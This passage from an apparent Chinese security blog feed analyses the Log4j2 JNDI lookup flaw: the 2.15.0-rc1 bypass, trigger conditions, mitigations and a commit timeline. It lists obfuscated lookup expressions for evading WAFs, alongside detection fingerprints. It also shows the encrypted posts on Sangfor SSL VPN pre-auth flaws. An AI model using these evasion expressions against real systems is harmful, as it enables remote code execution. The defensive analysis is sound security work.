src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/e712a600e6704c79ace4033855eaef8a.png" alt="e712a600e6704c79ace4033855eaef8a"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>通过一样的PoC，一直进入到MessagePatternConverter，这里发生了变化，原来的MessagePatternConverter.format全部通过新分配的XXXConverter.format实现，由于配置了lookup选项，所以交由<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter.LookupMessagePatternConverter#format</code>进行格式化（原来的MessagePatternConverter.format的修改也导致无法通过自定义factory进行绕过的风险</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder toAppendTo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> toAppendTo<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    delegate<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> indexOfSubstitution <span class="token operator">=</span> toAppendTo<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"${"</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>indexOfSubstitution <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        config<span class="token punctuation">.</span><span class="token function">getStrSubstitutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">replaceIn</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">,</span> indexOfSubstitution<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> indexOfSubstitution<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最终一路进入到，可以看到如果想要触发异常，需要<code>URI(name)</code>异常，这里就很好操作了（坏字符、空格…</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">final</span> String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        URI uri <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">URISyntaxException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// This is OK.</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="关于触发条件"><a href="#关于触发条件" class="headerlink" title="关于触发条件"></a>关于触发条件</h2><h3 id="lt-2-15-0-rc1"><a href="#lt-2-15-0-rc1" class="headerlink" title="&lt; 2.15.0-rc1"></a>&lt; 2.15.0-rc1</h3><p>在<code>org.apache.logging.log4j.core.pattern.PatternParser#finalizeConverter</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/2a3f499fe1f44d88a6c9ff825232bc6d.png" alt="2a3f499fe1f44d88a6c9ff825232bc6d"></p><p>很明显，需要进入到<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#MessagePatternConverter</code>这个类需要有特征转换标记<code>%m %msg %message</code>之一，转换标记在各个Converter中通过修饰符定义</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/e99ceba45b5f4d52b932574d174ff07d.png" alt="e99ceba45b5f4d52b932574d174ff07d"></p><p>而默认在 <code>org.apache.logging.log4j.core.config.DefaultConfiguration#DEFAULT_PATTERN</code><br>定义有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_PATTERN <span class="token operator">=</span> <span class="token string">"%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n"</span><span class="token punctuation">;</span></code></pre><p>当然如果开发自己写有配置文档，但是不带特征标记，也无法触发（但是谁会不记录msg呢？</p><h3 id="gt-2-15-0-rc1"><a href="#gt-2-15-0-rc1" class="headerlink" title="&gt;= 2.15.0-rc1"></a>&gt;= 2.15.0-rc1</h3><p>根据 <code>LOG4J2-3198 - Log4j2 no longer formats lookups in messages by default</code> 中的修改内容可以看到，启用lookup需要在占位符后添加<code>{lookups}</code>声明（选项）才可执行lookup解析</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/cf1ca4fd61824f459280a9acfd0825e1.png" alt="cf1ca4fd61824f459280a9acfd0825e1"></p><p>所以需要配置类似有</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>%d{HH:mm:ss} %msg{lookups}%n<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><h2 id="Waf-Bypass"><a href="#Waf-Bypass" class="headerlink" title="Waf Bypass"></a>Waf Bypass</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>表达式解析主要使用以下三个函数，通过深度遍历，解析所有存在的表达式</p><ul><li>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</li><li>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)</li><li>org.apache.logging.log4j.core.lookup.Interpolator#lookup</li></ul><p>代码比较长，做了个解析流程图</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/map_new.png" alt="map"></p><p>举几个例子方便理解流程和结果</p><table><thead><tr><th align="left">表达式</th><th align="left">解析流程</th><th align="center">是否替换</th><th align="center">结果</th></tr></thead><tbody><tr><td align="left"><code>${:-}</code></td><td align="left">1-2-4-6-7-8</td><td align="center">√</td><td align="center">空字符串</td></tr><tr><td align="left"><code>${::}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${lower:d}</code></td><td align="left">1-3-4-5-8</td><td align="center">√</td><td align="center">d</td></tr><tr><td align="left"><code>${clower:d}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${clower:hostName}</code></td><td align="left">1-3-4-6-8</td><td align="center">√</td><td align="center">本地 hostname</td></tr><tr><td align="left"><code>${c:d:lower:d}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${c:d:lower:-d}</code></td><td align="left">1-2-4-6-7-8</td><td align="center">√</td><td align="center">d</td></tr><tr><td align="left"><code>${lower:${:-D}}</code></td><td align="left">1-1-2-4-6-7-8-3-4-5-8</td><td align="center">√</td><td align="center">d</td></tr></tbody></table><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>这里只说纯表达式字符串在流量中的指纹匹配，初步就是检测<code>${j</code>、<code>${$</code>是否存在，解码获取完整内容匹配 jndi头、domain 信息等内容</p><h2 id="修补方案"><a href="#修补方案" class="headerlink" title="修补方案"></a>修补方案</h2><h3 id="标准方案"><a href="#标准方案" class="headerlink" title="标准方案"></a>标准方案</h3><ol><li>设置<code>log4j2.formatMsgNoLookups=True</code><ul><li>在 &lt;2.15.0-rc1 之前，使用自定义factory实际有很大隐患，可能导致绕过</li></ul></li><li>升级至<code>2.15.0-rc2</code>即<code>2.15.0</code><ul><li>可能需要升级JDK</li></ul></li></ol><h3 id="非标准方案"><a href="#非标准方案" class="headerlink" title="非标准方案"></a>非标准方案</h3><h4 id="PLUGIN-CACHE-FILE"><a href="#PLUGIN-CACHE-FILE" class="headerlink" title="PLUGIN_CACHE_FILE"></a>PLUGIN_CACHE_FILE</h4><p><strong>首先直接上结论：删除<code>META-INF/org/apache/logging/log4j/core/config/plugins/Log4j2Plugins.dat</code>里对应JNDI字符串即可</strong></p><p>通过上面知道strLookupMap中存有允许的前缀及对应处理类，而其在<code>org.apache.logging.log4j.core.lookup.Interpolator#Interpolator</code>中初始化有（看起来是这里</p><pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// [LOG4J2-703] We might be on Android</span>    strLookupMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>LOOKUP_KEY_JNDI<span class="token punctuation">,</span>        Loader<span class="token punctuation">.</span><span class="token function">newCheckedInstanceOf</span><span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.lookup.JndiLookup"</span><span class="token punctuation">,</span> StrLookup<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">final</span> LinkageError <span class="token operator">|</span> Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">handleError</span><span class="token punctuation">(</span>LOOKUP_KEY_JNDI<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而在<code>org.apache.logging.log4j.core.config.AbstractConfiguration</code> 初始化有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> StrLookup tempLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Interpolator</span><span class="token punctuation">(</span>propertyMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">final</span> StrSubstitutor subst <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StrSubstitutor</span><span class="token punctuation">(</span>tempLookup<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而实际最后是在这里填充可处理对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/08c804856ef5414497721122dd3b1cd3.png" alt="08c804856ef5414497721122dd3b1cd3"></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setVariableResolver</span><span class="token punctuation">(</span><span class="token keyword">final</span> StrLookup variableResolver<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>variableResolver <span class="token keyword">instanceof</span> <span class="token class-name">ConfigurationAware</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>configuration <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span>ConfigurationAware<span class="token punctuation">)</span> variableResolver<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setConfiguration</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>variableResolver <span class="token operator">=</span> variableResolver<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而configuration最终通过<code>org.apache.logging.log4j.core.config.plugins.util.PluginRegistry#decodeCacheFiles</code>缓存文件获取加载类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/d7273e6a7ae448deb7e99d27b7d8f425.png" alt="d7273e6a7ae448deb7e99d27b7d8f425"></p><p>所以删除<code>META-INF/org/apache/logging/log4j/core/config/plugins/Log4j2Plugins.dat</code>里对应JNDI字符串即可</p><h4 id="其他魔法"><a href="#其他魔法" class="headerlink" title="其他魔法"></a>其他魔法</h4><p>各种临时性的hook或者卸载对甲方来说并不实用，在此不表</p><h2 id="官方GIT时间线"><a href="#官方GIT时间线" class="headerlink" title="官方GIT时间线"></a>官方GIT时间线</h2><table><thead><tr><th>时间</th><th>行为</th><th>链接</th></tr></thead><tbody><tr><td>2021年12月5日 GMT+8 下午12:00</td><td>限制JNDI</td><td><a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3" target="_blank" rel="noopener">LOG4J2-3201 - Limit the protocols JNDI can use by default. Limit the servers and classes that can be accessed via LDAP.</a></td></tr><tr><td>2021年12月5日 GMT+8 下午3:20</td><td>默认nolookup</td><td><a href="https://github.com/apache/logging-log4j2/commit/04637dd9102175f765cfad349de0c2a63c279ac3" target="_blank" rel="noopener">LOG4J2-3198 - Log4j2 no longer formats lookups in messages by default</a></td></tr><tr><td>2021年12月10日 GMT+8 上午2:18</td><td>修复rc1异常绕过</td><td><a href="https://github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b" target="_blank" rel="noopener">Handle URI exception</a></td></tr><tr><td>2021年12月12日 GMT+8 上午7:05</td><td>默认禁用JNDI</td><td><a href="https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea" target="_blank" rel="noopener">LOG4J2-3208 - Disable JNDI by default</a></td></tr><tr><td>2021年12月13日 GMT+8 下午1:32</td><td>删除Message Lookups</td><td><a href="https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d" target="_blank" rel="noopener">LOG4J2-3211 - Remove Messge Lookups</a> <br>(开发急的…英文都打错了)</td></tr></tbody></table><h3 id="附言说说1-x版本"><a href="#附言说说1-x版本" class="headerlink" title="附言说说1.x版本"></a>附言说说1.x版本</h3><p>看有说要注意 log4j 一代可能也有安全问题，翻了下源码感觉实在没什么可说的，这么显式的lookup下还能出问题，纯属开发背锅</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没更新博客了~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>深信服 SSL VPN Nday - Pre Auth 任意密码重置</title>
    <link href="https://blog.sari3l.com/posts/9a92d107/"/>
    <id>https://blog.sari3l.com/posts/9a92d107/</id>
    <published>2020-09-15T03:04:12.000Z</published>
    <updated>2022-01-05T13:38:54.315Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="13fac3bc47da4076090bb5e7e3ec1bc2a6422cbc7934a4cd792ce0a7880ef39d">142c885a01311906cc2178ca32650b5489b02d0e8a2fb3da12b82a5260ba83bf03f44756a8577ef4d4021c193f5b9903e3cfb558cac8723df2a67923a6c49fe5eea9593df30bc91f46c85e8fd69b4ef4f981a9cb765a28ea734f76466b79f75f1cf0587e9f6819e5328504488a8b66d48d13d1626a2497578b0b72e3e8810b6e7f1e057f6630c2720345ebea31abaea9765c7803103ae2cb95a15aa85974fffa69eed6986b8222ae1a9e760a1c063c5076eb0a93f6deef28d59728e251b897e29ab9719a19fdaea6a370c99e8c01d02d6830297272cd9af34ced66e0aeb4f6c2ac6035f983583b225a9df6715fc4c385ff8d7688d5fd28314f861c612c70ecb3305cc01eaf048a56009dcdee700ca2e2c649ef3a6294c2b102349d370e2db7e04cfd4487e0e8f7da3222fa8ac0a8d6014e608a59502aa43798a97c4d8b209d9f3affddf2b724494122e5dffa75bf79c8cdac0a2ed267c1a23ece720d7ee97097883f66d5b5c52ac02c184d560738add4d30a02e3be21964e5907f3663fa4f7b898a1da97ee1dbc33fdbb1082c72b9a57a00eafc0fb2d617764ba4d3cf233b238d2d4e96a591fbfb28b0bd6528b17459b3f9e0d377f27b757cce902c75105f9f2f59a3b258bd26f21854cac75d36eb868dc33d811658e3b76043baf3c65c621d18abc1d016b297c38507804c03cd10bc49db6e60bf4ebed6d920f6aba8515e1928b2b97132a28a298b728a87a61d42344f6fd409efa4741cf45feb752505147dff524b4d89778378fd5c203a8d0c6677301d62a99f97560d4c940eaec8205fb073ceee0c176238cc8424f52cea715a3e50e69c5e1618975e8c9738194fbb7a5124ee618121f725a8490302af67599b7d2820ff4494ad4b4a0413c53f41be37f57a2950cd9a3e318c774dcbdf38f3836fda9874bce5aa16f2aebecd65f73e0195b76b53a7f9402212b767d14720b233ec1e1f3162df06a7afa1ac8b5dcdfec7efb0965bfa7ef026dfb9dbb798330a909f3bbcffb89b7d0b58f4e3b2f5bbd0869a2128992cbc5209691ef1829c836ed0f74676a70b7cc72a21a6a53dc35ef5d77d4effc0202bb99797e7448f310b3aea3c1e4697905ac485fe6edead0ff50a0adb6213e754f6bd9f68d6577832b11b0d7e3789b40fe2405520413ef5de09cd2429390d94d7cf52085e539344cd5364df5cd58831c0213b4a2a99c6bd9c7ee1e1a3cec90b1fe0a66b641399d75356dd0c4b8d0b2d9b1ae9b85794ba4cb114ccee057eb1d35b73358f5de9229c437e6ab4a92ab75bdbacd5a675213e73482e0e12934435f25939e223f6ea46518a0a462072364280f285d8ce44502bf3871d72b87abd996525c2ca82c5f5c920c36e12098d41f6db4675547fa45bdde86374c2529725d729554339d4780d0aff5cebefbc92998527e458728e5c7760afec02bc57e650e6b4a9b12fda7bf805f8bc310f0ecd5e41ba0f4add6e3cf0fecc524c5fc7b47bef870305b21dd4b0709faf9c8f18f4b8a8d77e967b0fcb7672c9b0b5d594c7d56e49180a18740333260cfe2b97d9a3df2ec20044cf7854602cfa0830ef0c7a0a0f40bcd216c2740df06ba628ebbc93074af3d8f3547702b06e7f6f53e6aa51c421c83bdc2ab9a86150d2a9c66235b7e60a30fa7ec13357c606aa57e49c17a2e79498282c0c5f8edb6c8e85a13ef579b3b1eddd00767a30fef8fe9e9132237f18f0bb93792e4a0df308a97477f023dee5fcedc80f6e054c20b7ccfe905db41a78bebd33799641c8069492e61fe2fac578ae1f7017ed9aebfb17dcb596ee7c6faaf3049c77ab6a2200ada722a47f026dc7b287742f97f0f479a1d070f229a5817120631207d784a241f5ddf6bf413f97977260ff59d313d52033e00ec70d26ec095c4b43598eed7182119db5b49a2018987cb105e9927b6953a98d102d1977c969a2792784c99d3e3d1d00b423ff38971af79ffe2c5f7686239aaf3cd4c4ebaf54bf075545005dc0a96d1e00a3627d2f41a7e1163fd3328a77fcb3183199970e52c1eb9181e71370131acfe657cb9566a55ed662fae0f43d1e14a9c903670b897125f8ad027259665933ebd9c2fe18b48f767d97350315fd5bdae0dd3d777d7a680f8bc2f7b936a0cd316bac2e360e5d34b7af1ce7087ba50e6d4ebda29162d38d62778d12c79c8fb1e69a454a3b2fc1e70007d5318a68e67a7e74342ef237ddb4891589110851abb56a873386eb40551b1bc168960144272e4456410977095e0715ad091aa38bbaa0e0d334f4207cf973e54b8a607cef0a2fa9ffd3b30351db9e7042901b9214fea612a836e76dc2b9b759294542d47f3529af503ed77e0a8121e46c34f3c2d519e34cd4e5c88c1d80d226435e83f68e9a518608da93965b34f4a8c70b29ebcaae477d280f04161bfbb82ad9e32394abebebf3c4b3c0788a3c7b39fefaef8cf914702824a8708f58391e21416e0f96ae3295e112a92e0d45b6d736ec230d8f8027241704891e2ad2a705e1e54c11a0169ca1aad94d1da373a8e741b5c0362dd02273799ff5c1611bb9582789153647d1ae706ba9276d23472fd6fb828cd5365c0166ed5b5b49258c37179d87a62009dd9e11fa3aa933ec727fb4d772a1c9c8477cbc647613db1e1c4e134a2a8a5eaf1c0a15e0eab063a1c6d94527e69ecde9fc6a6ddac40cb884e8190c662c71bcafe78bcd2d0eb3a1b160f4d0bd39a1a66c77be58dd5dd63648557129d08ca4c6335bf6a2d558fecc499359ab65766e7222ab2a075531ee3be5611db2b5192eef03172a6ca5e9f7f53006815da762d7c294ff3a92356e179183682f67971f6d664035aea93bb0865eff4270af29ad881c0e86fbdbb18b11fda807bc413f36d509ee294fba85061995976ef3ebca215f19df15dda1f04064fd343b9be6f0d83b24cbe239f9de024cf69cb5c1d64411d4242bcd0aed0a155563ea5872e035b0c5f877c379b3577e420fb74c3c457692bdf0b9f36142d26474a72066ee58169e94653dfc8a28715198c2a42435cd5058ceefecc527d2655ce67f2cd190658f50fbd5f72957e58098c0cc31282754b19a532150647f9cd96a289b063e5222a5c4aa0731c00520d312632b305e36352ac7591fad6449aca43c236459447436a3c3f7277bd7425a260b8913fcce9b786dfeb888cf09e2e5ddf5d8af4c9b5d252bf32cadace2eed884f95f36033d16796b628a3b4a8fcb849cb84bceb76cb010c05d8e146a147953a1384d6e6b7e128afa1caf779dd49ad7229f20f98ae8a6cd6aeecf7e21f1421f63156d1ac4587ca4d483009730ceb8de419bbb1afb6bf4a0a164c417ed4ba812cfe2e58511d09783c5d02fecfd6b6519cbffc1249b356bcf85822a95a0b6e82593bb208fb8c23aa02085d06e46de82e4ba32cb974741f02b62c2b11760e246e212ca93a096033b2794af48da59ecc4640ff92babe2def539c72d852f32ce73d555375c0e71c3ffc70342ba70f6d3be26557894a47b7684da0bcfa63be3f8adc8019693ac9a72a78fb86bd76f1dbde737f37ece68276d7639afd9a864539473a51346faf5c496261965a6900db83550617ae7c8e76056c2a6d1c7d8feb54327fedaefd3decbc523f0d9cd228be03a61d162164fa33be121ebc547d84bba4ee44f0217e9836d81bb506a6ee94441f2d5f7165ed3807d732a568faac933aa886e56e0805cd0e95ae6152c4011cafc971e5b9f363204098531bd4a25c1addc10a62b463cb1d85a2b35ed14ea8c64633267c8324b52b07282864172d1c883df00cff1f457e555bb624c29198640ed74a81f9d2bfc5ca798ccfecca62de301816db1eae22e01eee49454e7d3a585fd87fc9d7a3b2d111deb13fb24dfafb49c50ed0946b01695e0816dd556c362bdd5c9781a39c3db5a37dda306193d41fdc15d662f426886641f6ab95bfc1bfab85fc18c588c314df09933cb9299edc13e7547dd8f8794127b5ebff31b21cc1f3f9ed10e3cd0c1643ef76d8e79cf74a7699ed97226642bf41f4e910f2d15be786eda4110b6925e494ea28aa60f99c5b541cb55b2c1e94d09e2d4f04f9df99870b8272f688259abf641deff75f1c4c253cd8cd38c79a61d485d8d44a1cb71e371aed5b4029ec9df71b5f7a846551f63f7b88e3c6064607cbe304396b7a8f1a036e905d8a2e7f7a4cf0c8a7da8483dee0de9fc02159907643dc0086bb1c60f8efec9c41aae0b05c2a166f687ac28a03b5cf3d926c5893d6489cd4a1177b774eeeb670e9e6c774b8f8f9a7af7aac98814f4b51fa99192af3b33e70124fceb17020ea42cb95b96aa9c89efd38f167d76281743d406488ab17b2aea1f5c36cb97f6f209af2d1b37c6a8a98ec0c4600ab94a9f42f59a013b632c7f4f012c6badf9f6cfd4e3fe3d71c30bbf2daf4191e53b6bb078f231d38ab960c453075fb4d3d44cbed71e8868b4b7016a38da2886bd9ac8c4cf9bb97857d76dd1b9bd67bb468288a6f953f240756b57c945605e92d3a97e705bd5c875cca6dc9471edb102d0d2c106af15604f3b7fdbffe183ceedeaced0b168c658496ce981026d0e11f21c4d9ce18c18e3d6a677faefce736480aa0fcd89059b1c3ef39f876235c7c75c01296ff1f6562a2fdc2668d7baaf22ae425f370e54a9d7c2b8ab2291a4dbd2fe3449445e86c6270d1dfce2f1944e738df0f06e52c3dd4e9ad9a48b4e75e4864612dab648e8b920f637df9819f42dcb0275748c03c0138b5a72e1aa3b51712c3c1d95a5525b9b6ba472f60a82cad2cc3e4355571c2a2f0c4d89e7ee192ff1f91d1c38a05798f1376e549934e97f883311193005355d48722bd6d81a31a5b352fe3dddc1427a6e213f40294c1d577a128320c8b1abb302449a2ac59485503d66aefcba66791a2c1edf8f6915c8be5db5d8bcadc7b228aeed947985c95e921ee168df886d30437e23ee2ae8135bf4d7b3fa7eb3a27b1eb5644b4b9bf4743d01c248cee05701ddc4d50fb9817450e997b33d1fb99b3a9c58354129664df50351f9c68754cfee9461024b64f89cbe7cfb4408de92d2a7e6d6b3321484a3003ea84f0ec863f3727ef4096f99be54ef21c80130f81538ee8883050aeb96ac298e5b03b7bc7458de2f3bd647d73106cfda2f268990ec8b60a69aa0c0a95fd27594c24a901342a82920e9cb0263f8dd2f6009cc09532c8c4e2e72d79b1c260ff4b83e8c3adabd7079a91916718727e99cefe75acccdead2672a58268c0465523ca1991f74cdb493204c218902a637dda60a29ec6469d1e4fe52681238eedbb9c4f97646f86b3e6dda90503f9c604d0df88711e95eb5f2785f490779ebdfaf8957b27a0177ec8bec4c76d717c2bc792a5b7e72b5699ef9d3f9d3dd18d1c38051c07e9b645fb74056889a7abae104ae618b9f80f4eef5d31bd8cdbddec1fd3be4b063a011fee6dd6755b1502110b3dc868c77b38497842da6e45857f178ea964a4cc7beccc94afdd42635591445c8e355412c67ea88671c4cfec111878e43e873851a2ce66551f539ae9bdd1a3bc34c7882643fe0d23c58a465e36af1b9ed44cced88e811437a5b04d2ebcdde882e2c91bbb00ffb797db459ecea0220a133e54e6faff1be1c9e7cbf1b5c033646fd5f3ba0416db1109e96edc45532014b6492aa345fa3cf283c0b0eafefa2e43357549ee11affc8d5f9ef970560a2fbf2c7004138f7959bca9a44cf0443e57cf43c2784be1b800874b20edebb4dd4f9aa9bfa623e37474f532dcae49401f3255314d8e21c7626744c07b07c2a50d47a09863dc7db672df77c4cff832af5fb37700fe915d26ae267443bfee07667d572856d2393aacdd452c742925b1ca4130839e88becffbd69a2245c23e6ed2ba783413f57f531ed3bc9584c750fc92e394b66c1f3a6dc56900f2139d38a698fbf7947a831b8ead51343ff7ef59aa2b661dcd6dbf82d5ce4a90d305f23ad6d2792246534f3e3ea66c08ebbf74932f57a0b52a7b56d26c88ea263bee05e78adff83f25a302f0741926727e54b6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      应厂商需求加🔐，待合适时间重新开放，请勿二次外泄
    
    </summary>
    
    
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
  </entry>
  
  <entry>
    <title>深信服 SSL VPN Nday - Pre Auth 修改绑定手机</title>
    <link href="https://blog.sari3l.com/posts/fd03bf87/"/>
    <id>https://blog.sari3l.com/posts/fd03bf87/</id>
    <published>2020-09-14T16:09:16.000Z</published>
    <updated>2022-01-05T13:39:13.678Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c69b89c8532c350150e2acd70331084f81f7e617f000e901bdf1939b59c32268">8a6b57f33d1755f3d4ced00d3b81eb6dc3140cc81887cec2f8c303885531160ffa42fe8bcc83ac4e6789711f3c5c8dca7b65f880f5db69d847e7e9a22881eb23cddd6a6723a5e26be409e55cf2ac624d8204e83bb1e1618bca1d9bb98e8307a032f5e1af32089d37d35f9c5fb23d68a73bce20e3fff110946861bc3c2c8d26c5ed18b76d425486cb8be2f8b04862bf973dc7b190e5a76dd3e5c6b2fb1e4ba34b15ea90719526b87d5a3d98fbfd5b2d0b6e3bdac0c7ad67819a3b6e78d4ae8c5a25b0facd90fd04ab361b913e58fd844b3ca910d0846ccd22586e2c1f806df5330b65832e6f65377f404f4b5af1e665969a80bdd1d65711389ff71668f0e36d25dfdffba0309adb20234a50af43e2102f3387320be966db2e3ea28866fcde4205e3672760588131902cc7944b17a2f553fddfc3c85152d8f68aac013406d8eb7cd3a052616a2fc58afe04dd1f7b085f9416570b5f70d6adfb1ade88110dc8998f7bbe2e3e803b6a2fd44e28e9f1ee06ed966234562debd04f42b5caf98de208c7e7a703a11cbc970d948ae1462a99db5ae932a5374e1a14e19b3cd04d7feafb7e1752241c8f5ca37265a88c9104fd7260e9edeaf964033b89dd74648938727de9d7fc6f0d75cbc111d5c5fc38841dcc26acfa01dcae7f50161c94fc3fcc0bdd72422605ddbd3e12ab5160d2dafc5f63a88a84de52b7b70907750ac9f1fe77f21cac39b43ef7